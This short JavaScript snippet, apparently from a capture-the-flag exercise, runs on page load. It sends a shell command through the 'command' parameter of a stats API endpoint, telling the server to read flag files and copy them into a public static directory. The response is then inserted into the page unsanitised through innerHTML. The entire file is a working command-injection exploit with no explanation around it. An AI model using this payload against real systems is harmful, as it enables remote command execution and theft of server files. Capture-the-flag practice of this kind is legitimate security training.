window.onload = async () => {
    let stats = document.getElementById("stats");
    const response = await fetch("/api/stats?command=cat%20/flag*%20>%20/app/static/flag.txt");
    const data = await response.text();
    stats.innerHTML = data;
}